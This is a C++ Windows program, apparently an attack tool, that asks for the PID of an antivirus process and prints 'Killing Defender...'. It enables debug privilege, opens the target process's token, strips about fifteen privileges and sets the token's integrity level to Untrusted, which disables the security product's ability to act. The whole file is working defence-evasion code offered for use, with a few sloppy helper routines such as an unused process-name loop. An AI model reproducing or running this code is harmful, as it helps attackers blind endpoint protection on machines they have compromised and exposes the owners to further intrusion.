
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <TlHelp32.h>

#include <conio.h>


bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return   FALSE;
       
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        CloseHandle(hToken);
        return false;
       
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        CloseHandle(hToken);
        return false;
        
    }
   
    return true;
}

int getpid(LPCWSTR procname) {

    DWORD procPID = 0;
    LPCWSTR processName = L"";
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);


    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processName, procname) != 0)
        {
            Process32Next(snapshot, &processEntry);
            
            procPID = processEntry.th32ProcessID;
        }
        printf("[+] Got target proc PID: %d\n", procPID);
    }

    return procPID;
}

BOOL SetPrivilege(
    HANDLE hToken,          
    LPCTSTR lpszPrivilege,  
    BOOL bEnablePrivilege   
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            
        lpszPrivilege,  
        &luid))        
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;



    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}


int main(int argc, char** argv)
{

    LUID sedebugnameValue;
    EnableDebugPrivilege();


    DWORD pid ;
    std::cout << "ENTER PID OF THE PROCESS -> ";
    std::cin >> pid; 


    printf("PID %d\n", pid);
	printf("[*] Killing Defender...\n");
   


	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ , true, pid);


	if (phandle != INVALID_HANDLE_VALUE) {

		printf("[*] Opened Target Handle\n");
	}
    else {
        printf("[-] Failed to open Process Handle\n");
    }

   printf("%p\n", phandle);
  
    HANDLE ptoken;

    BOOL token = OpenProcessToken(phandle,TOKEN_ALL_ACCESS, &ptoken);
    printf("OpenProcessToken error: %u\n", GetLastError());
     std::cout  << token << std::endl;
    if (token) {
        printf("[*] Opened Target Token Handle\n");
    }
    else {
        printf("[-] Failed to open Token Handle\n");
    }

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);


    TOKEN_PRIVILEGES tkp;
    
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {

        printf("[-] Failed to Adjust Token's Privileges\n");
        //return 0;
    }

    
   
    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
    SetPrivilege(ptoken, SE_TIME_ZONE_NAME, TRUE);

    printf("[*] Removed All Privileges\n");


    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;


    SID integrityLevelSid{};
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

    if (!SetTokenInformation(
        ptoken,
        TokenIntegrityLevel,
        &tokenIntegrityLevel,
        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
    {
        printf("SetTokenInformation failed\n");
    }else{

    printf("[*] Token Integrity set to Untrusted\n");
    }

    CloseHandle(ptoken);
    CloseHandle(phandle);


    system("PAUSE");
    return 0;
}